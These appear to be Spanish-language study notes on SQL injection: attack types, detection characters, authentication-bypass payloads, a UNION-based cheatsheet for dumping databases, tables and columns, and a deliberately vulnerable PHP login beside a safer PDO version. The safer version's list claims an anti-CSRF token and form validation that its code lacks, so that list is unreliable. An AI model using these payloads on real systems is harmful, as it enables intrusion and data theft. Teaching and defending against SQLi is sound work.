### ¿Qué es SQL?
SQL es un lenguaje de consulta estructurada (Structured Query Language) y se utiliza en desarrollo para almacenar y procesar información en **bases de datos relacionales**. Los datos están organizados en tablas (columnas y filas) cada fila es un registro único y cada columna es un atributo específico de datos.
![[sql-vs-noSql.webp]]

![[relationalDB.webp]]

SQL es el lenguaje con el que consumir, procesar, modificar y escribir la información que hay en este tipo de bases de datos
### ¿Qué es SQLi?
SQL injection es una vulnerabilidad que busca modificar las queries o consultas que se están haciendo a la base de datos desde la aplicación. Es decir, el atacante busca manipular las instrucciones SQL que van desde la aplicación a la base de datos, normalmente con el fin de acceder a información a la que no debería tener acceso.
Este tipo de ataques pueden tener consecuencias catastróficas, ya que el atacante puede acceder a información de carácter muy sensible, y en ocasiones modificar o eliminarla.
#### Tipos de SQLi
##### In-band SQLi
El atacante utiliza el mismo canal para atacar a la aplicación y ver los resultados.
**Error-based SQLi** --> El atacante envía queries buscando provocar errores en la base de datos, con el objetivo de aprovechar la información proporcionada por los errores para recavar información sobre la BBDD.
**Union-based SQLi** --> Esta técnica se aprovecha del operador SQL `UNION`, que fusiona varios comandos de tipo `SELECT` en una respuesta HTTP, dicha respuesta podría contener información sensible.
##### Inferential(Blind) SQLi
El atacante realiza su explotación "a ciegas", envía los payloads y espera a observar el comportamiento del servidor para recavar información.
**Boolean** --> El atacante envía una query buscando una respuesta de la base de datos, esta respuesta variará en función de si la consulta resulta evaluada como `TRUE` o `FALSE`, en base al resultado la respuesta HTTP se mantendrá o cambiará, haciendo posible deducir como la DB ha evaluado la query.
**Time-based** --> El atacante envía una query que hace "pensar" a la DB durante unos segundos antes de responder, el atacante puede deducir en base al tiempo que tardó en responder si la query se evalúo como `TRUE` o `FALSE`.
##### Out-of-band SQLi
Este tipo de ataques se llevan a cabo cuando el atacante no puede usar el mismo canal para enviar las queries y recavar la información, o cuando un servidor es demasiado lento/inestable para realizar estas acciones. Las técnicas out-of-band explotan la capacidad del servidor de hacer peticiones DNS o HTTP para exfiltrar información. 
#### Detección
Para explotar SQLi, la idea es buscar inputs de usuario en la aplicación que no están siendo correctamente sanitizados, de manera que podamos enviar una query arbitraria a la base de datos.
Esta es una lista con algunos caracteres que pueden triggerear errores de SQL, exponiendo un input vulnerable.
```SQL
'
"
;
)
*

%27
%22
%23
%3B
%29
%2A

%%2727
%25%27

U+02B9
U+02BA

`+HERP
'||'DERP
'+'herp
' 'DERP
'%20'HERP
'%2B'HERP

page.asp?id=1 or 1=1 -- true
page.asp?id=1' or 1=1 -- true
page.asp?id=1" or 1=1 -- true
page.asp?id=1 and 1=2 -- false
```
Otra opción es identificar estas fallas mediante *Timing Attacks*, ciertos comandos como `SLEEP` o `BENCHMARK` en MySQL pueden causar un delay en la respuesta, indicando un punto de entrada.
##### Detección de DBMS (DataBase Management System)
[PATT](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#dbms-identification-keyword-based)
### Casos de explotación
#### Auth bypass
En los mecanismos estándar de autenticación, quien quiere autenticarse introduce un usuario y una contraseña. En el caso de que un panel de login hiciese una consulta a la DB SQL de sus usuarios para verificar que las credenciales son correctas, podríamos ver una query como esta.
```sql
SELECT * FROM users WHERE username = 'user' AND password = 'pass';
```
Si el atacante pudiera inyectar con éxito el siguiente payload, por ejemplo en el campo de usuario
```sql
' OR '1'='1
```
La query final quedaría así
```sql
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '';
```
Como `1=1` siempre sale `TRUE`, se estaría bypasseando la autenticación. Este caso concreto tiene un matiz ya que la respuesta tendría múltiples (todos) los usuarios, sin embargo podría sustituirse el payload por 
```sql
' or 1=1 limit 1 --
```
Para entrar como el primer usuario registrado, o podría inyectarse uno como este en caso de conocer el nombre de uno
```sql
galizaragoza ' OR '1'='1
```
##### RAW MD5 y SHA1
[PATT](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#raw-md5-and-sha1)
#### Cheatsheet para exilftración
##### #1: Sacar el número total de columnas
Inyectado el siguiente payload, podemos incrementar el número hasta que la aplicación de un error, ahí sabremos la cantidad total de columnas 
```sql
' ORDER BY 1-- -
```
##### #2: Recuperar todas las DBs
Sin concatenar; puede causar errores
```sql
' UNION SELECT schema_name, 2, 3, 4, 5 FROM information_schema.schemata-- -
```
Con concatenaciones
```sql
' UNION SELECT GROUP_CONCAT(schema_name), 2, 3, 4, 5 FROM information_schema.schemata-- -
```
##### #3: Recuperar las tablas y columnas de una DB concreta
Con esta query se recuperan las tablas
```sql
' UNION SELECT GROUP_CONCAT(table_name), 2, 3, 4, 5 FROM information_schema.tables WHERE table_schema = '<Base de Datos>'-- -
```
Y con esta otra las columnas de una tabla
```sql
' UNION SELECT GROUP_CONCAT(column_name), 2, 3, 4, 5 FROM information_schema.columns WHERE table_schema = '<Base de Datos>' AND table_name = '<Tabla>'-- -
```
##### #4 : Recuperar los datos
```sql
' UNION SELECT GROUP_CONCAT(<Columna>, ':', <Columna>), 2, 3, 4, 5 FROM <Base de Datos>.<Tabla>-- -
```

### Mitigación y prevención
##### Prevención
Hay varias medidas para prevenir ataques de este tipo:
- Validación de entradas del usuario (sanitización) --> Es importante desconfiar de todo lo que entra al sistema desde inputs del usuario, ya que un atacante puede aprovechar esta falta de validación para vulnerar la aplicación.
- Firewalls que filtren las queries SQL maliciosas
```php
<?php
// CONEXIÓN A LA BD
$host = "localhost";
$user = "root";
$pass = "";
$db = "usuarios";
$conn = new mysqli($host, $user, $pass, $db);

// RECEPCIÓN DE DATOS SIN VALIDACIÓN
$username = $_POST['username'];
$password = $_POST['password'];

// 🚨 QUERY VULNERABLE - CONCATENACIÓN DIRECTA
$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
$result = $conn->query($query);

if ($result->num_rows > 0) {
    echo "Login exitoso!";
} else {
    echo "Credenciales incorrectas";
}
?>
```

```html
<form method="POST" action="login.php">
    <input type="text" name="username" placeholder="Usuario" required>
    <input type="password" name="password" placeholder="Contraseña" required>
    <button type="submit">Ingresar</button>
</form>
```
Este código es un ejemplo de como **NO** hacer un formulario, el script toma los datos tal como entrar desde el formulario y los pasa en forma de query a la base de datos, y el formulario no sanitiza la entrada.

```php
<?php
// CONEXIÓN SEGURA A LA BD
$host = "localhost";
$user = "app_user"; // Usuario con permisos mínimos
$pass = "StrongPassword123!";
$db = "usuarios";

try {
    $conn = new PDO("mysql:host=$host;dbname=$db;charset=utf8", $user, $pass);
    $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    
    // VALIDACIÓN Y SANITIZACIÓN
    $username = filter_input(INPUT_POST, 'username', FILTER_SANITIZE_STRING);
    $password = $_POST['password'];
    
    if (empty($username) || empty($password)) {
        throw new Exception("Todos los campos son requeridos");
    }
    
    // 🛡️ PREPARED STATEMENTS
    $query = "SELECT id, username, password_hash FROM users WHERE username = :username";
    $stmt = $conn->prepare($query);
    $stmt->bindParam(':username', $username, PDO::PARAM_STR);
    $stmt->execute();
    
    if ($stmt->rowCount() === 1) {
        $user = $stmt->fetch(PDO::FETCH_ASSOC);
        
        // 🛡️ VERIFICACIÓN CON password_verify()
        if (password_verify($password, $user['password_hash'])) {
            // Login exitoso
            session_start();
            $_SESSION['user_id'] = $user['id'];
            $_SESSION['username'] = $user['username'];
            
            header("Location: dashboard.php");
            exit();
        }
    }
    
    // Error genérico (no revelar información)
    throw new Exception("Credenciales incorrectas");
    
} catch (Exception $e) {
    error_log("Login error: " . $e->getMessage());
    echo "Error en el login. Intente nuevamente.";
}
?>
```

```html
<form method="POST" action="login.php">
    <input type="text" name="username" placeholder="Usuario" required>
    <input type="password" name="password" placeholder="Contraseña" required>
    <button type="submit">Ingresar</button>
</form>
```

Este otro ejemplo, por otro lado, tiene varias medidas de seguridad añadidas:
1. Evita la concatenación directa en la query
2. Hashea las contraseñas
3. Sanitización de entrada
4. Errores genéricos (no revelan información de la DB)
5. Principio de mínimo privilegio en el usuario de la DB
6. Token anti CSRF
7. Validación en el formulario
##### Mitigación
- Criptografía: Hay que asegurar que toda la información, o al menos la sensible, esta correctamente protegida mediante métodos criptográficos para que en caso de sufrir una brecha, el atacante no tenga acceso a los datos en texto plano
### Recursos
[PortSwigger SQLi cheatseet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
### Fuentes
[OVHCloud](https://www.ovhcloud.com/es-es/learn/relational-vs-non-relational-databases/)
[Imperva](https://www.imperva.com/learn/application-security/sql-injection-sqli/)
[PortSwigger](https://portswigger.net/web-security/sql-injection#what-is-the-impact-of-a-successful-sql-injection-attack)
[PATT](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass)